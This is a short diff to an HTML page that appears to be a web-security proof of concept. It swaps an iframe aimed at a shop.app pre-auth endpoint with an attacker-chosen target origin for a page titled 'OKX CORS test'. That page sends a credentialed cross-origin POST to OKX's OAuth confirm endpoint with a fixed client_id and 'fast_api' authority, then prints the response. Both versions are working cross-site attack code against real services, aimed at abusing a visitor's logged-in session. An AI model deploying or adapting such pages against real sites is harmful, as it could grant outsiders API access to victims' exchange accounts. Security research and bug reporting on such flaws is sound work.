@@ -1,1 +1,33 @@
-<iframe src="https://shop.app/accounts/pre_auth?client_id=0402b12f-5693-42fa-adbe-3e9e10dac6ad&target_origin=https%3A%2F%2Fvictimibh-star.github.io"></iframe>
+<!doctype html>
+<html>
+<body>
+<h2>OKX CORS test</h2>
+<button onclick="test()">Test</button>
+<pre id="out"></pre>
+
+<script>
+async function test() {
+  try {
+    const r = await fetch("https://www.okx.com/v3/users/oauth/confirm?t=1789938393698", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        client_id: "3fe1ee51d88a4c1cab8694faf7752e95Q2XtBWdH",
+        authority: "fast_api"
+      })
+    });
+
+    document.getElementById("out").textContent =
+      "status = " + r.status + "\n\n" + await r.text();
+
+  } catch (e) {
+    document.getElementById("out").textContent =
+      "CORS/Fetch error:\n" + e;
+  }
+}
+</script>
+</body>
+</html>
